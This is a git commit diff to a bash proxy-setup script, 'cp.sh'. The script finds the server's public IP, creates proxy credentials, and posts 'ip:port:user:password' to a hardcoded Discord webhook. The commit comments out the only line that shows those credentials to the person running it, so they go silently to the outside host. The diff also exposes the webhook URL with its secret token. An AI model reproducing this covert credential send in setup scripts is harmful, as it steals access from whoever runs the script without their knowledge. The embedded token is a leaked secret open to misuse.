da219604b893d9bbc7025f92e8305146672b10fe
LemonProxiesDev <70445676+LemonProxiesDev@users.noreply.github.com>
2020-09-01 15:15:38 +0200

    Update cp.sh

--- cp.sh
+++ cp.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 # Get Datacenter IP ()^M
 ip=$(wget -O - -q -4 https://icanhazip.com/)
-ip1=$(wget -O - -q -4 https://icanhazip.com/)
+#ip1=$(wget -O - -q -4 https://icanhazip.com/)
 
 # Get Datacenter Port ( Default )^M
 port=3128
@@ -17,13 +17,13 @@ echo -e "\e[1;93mUSER CREATED! \e[0m"
 
 echo -e "\e[1;93mDONE ! \e[0m"
 
-echo -e "\e[1;93mYour Proxy is : ${ip}:${port}:${user}:${passw}\e[0m"
+#echo -e "\e[1;93mYour Proxy is : ${ip}:${port}:${user}:${passw}\e[0m"
 
 #**Discord Notify**
 #!/bin/bash
 ## format to parse to curl
 ## echo Sending message: $message
-msg_content=\"$ip1:$port:$user:$passw\"
+msg_content=\"$ip:$port:$user:$passw\"
 
 ## discord webhook
 url='https://discordapp.com/api/webhooks/750337905054056588/5fP6iSAPGFHi2un9ayvAGHtokf7BSf5FWTSP86BdgbU2oJKI9icZRDSUcDqcSFy2A7h5'
